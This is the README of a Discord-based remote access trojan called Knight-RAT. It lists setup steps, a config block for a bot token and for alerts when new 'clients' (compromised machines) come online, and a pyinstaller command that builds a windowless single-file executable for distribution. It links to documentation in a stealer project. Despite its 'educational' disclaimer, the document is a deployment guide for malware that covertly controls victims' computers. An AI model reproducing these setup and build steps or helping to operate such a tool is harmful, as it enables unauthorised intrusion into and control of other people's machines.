# Knight-RAT
Discord Remote Administration Tool

⚠️ **Educational Purposes Only!**

Prerequisites:
- python 3.9-10
**Do not forget to add it to path!**

Setup:
- `pip install -r requirements.txt`
- Edit this config in the knight.py:
```py
### CONFIG

btoken = '' ### REQUIRED | DISCORD BOT TOKEN NEEDS TO BE PUT HERE FOR THE RAT TO WORK
prefix = '' ### OPTIONAL | IGNORE THIS IF YOU WANT TO RUN COMMANDS WITHOUT A PREFIX | PREFIX THE DISCORD BOT WILL BE CALLED WITH
userid = '' ### OPTIONAL | IGNORE THIS IF YOU DON'T WANT TO BE PINGED | ONLY WORKS WITH CHANNELID SET | THIS IS THE USER WHO WILL BE NOTIFIED ABOUT NEW CLIENTS WITH A PING
channelid = '' ### OPTIONAL | ONLY SET IF YOU WANT TO GET A MESSAGE WHEN NEW CLIENTS GET ONLINE
```
**Make sure you have all intents on the bot enabled and the bot on your server.**
- `pyinstaller --noconsole --onefile knight.py --clean`

## Execute >help, .help or whatever your prefix is to see all commands. This was a fun project which wont receive updates anymore now. (probably). Some commands dont work. Explaination on how the Id system works is [here](https://github.com/rose-dll/Rose-Stealer/blob/main/docs/KNIGHT.md).
